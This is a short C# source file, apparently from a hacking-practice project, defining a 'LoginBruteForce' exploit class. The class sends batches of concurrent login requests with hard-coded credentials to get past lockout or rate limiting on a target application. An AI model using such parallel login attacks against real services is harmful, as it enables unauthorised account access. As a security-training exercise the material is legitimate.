﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using WeHackSecrets.Services.Actions;

namespace WeHackSecrets.Services
{
    public class LoginBruteForce : IExploit
    {
        private ILoginAction[] _loginPool;
        private bool _successful = false;
        private string _secretValue = "";

        public LoginBruteForce(ILoginAction[] loginPool)
        {
            if (loginPool == null) throw new ArgumentNullException("loginPool");

            _loginPool = loginPool;
        }

        public bool Successful
        {
            get
            {
                return _successful;
            }
        }

        public string SecretValue
        {
            get
            {
                return _secretValue;
            }
        }

        public void Exploit()
        {
            var counter = 0;

            while (counter < 100 && !_successful)
            {
                Task.WaitAll(_loginPool.Select(x => x.LoginAsync("User1", "1234")).ToArray());

                if (_loginPool.Any(x => x.Successful))
                {
                    _successful = true;
                }

                counter++;
            }
        }
    }
}
